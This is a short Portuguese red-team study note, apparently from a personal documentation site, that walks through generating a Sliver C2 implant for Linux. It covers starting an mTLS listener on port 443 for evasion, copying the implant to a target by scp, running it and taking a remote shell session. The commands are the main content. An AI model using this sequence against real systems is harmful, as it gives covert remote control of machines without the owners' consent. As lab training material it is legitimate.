> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/sliver-c2/listener-and-implant-creation/generating-and-delivering-implants-on-linux-targets.md).

# Generating and delivering implants on Linux targets

**Objetivo**

Gerar um implant para **Linux**, configurar um **listener** e obter acesso remoto (shell) via Sliver C2 em ambiente controlado.

**Gerar o implant Linux (ELF)**

No Sliver:

```
generate --mtls <SEU_IP>:443 --os linux --save /home/kali
```

Pontos importantes:

* `--os linux` → gera binário **ELF**
* `--mtls` → comunicação criptografada
* Porta `443` ajuda na evasão
* Arquivo será salvo no diretório definido

**Configurar o listener**

Ainda no Sliver:

```
mtls --lhost 0.0.0.0 --lport 443
```

Explicação:

* `lhost 0.0.0.0` → escuta em todas interfaces
* `lport 443` → deve ser igual ao implant

**Transferir o implant para o alvo**

Exemplo usando SCP:

```
scp implant <user>@<IP_ALVO>:/tmp/
```

Ou outras opções:

* Python HTTP server
* Netcat
* Pendrive (lab offline)

**Executar no alvo Linux**

No alvo:

```
chmod +x implant
./implant
```

**Estabelecer conexão C2**

No Sliver:

```
sessions
```

Verifique:

* Nova sessão ativa listada

**Interagir com o alvo**

```
use <session_id>
```

Agora você tem um shell remoto.

**Manter sessão em background**

```
background
```

**Fluxo completo**

1. Gerar implant (ELF)
2. Iniciar listener
3. Transferir payload
4. Executar no alvo
5. Receber sessão
6. Interagir
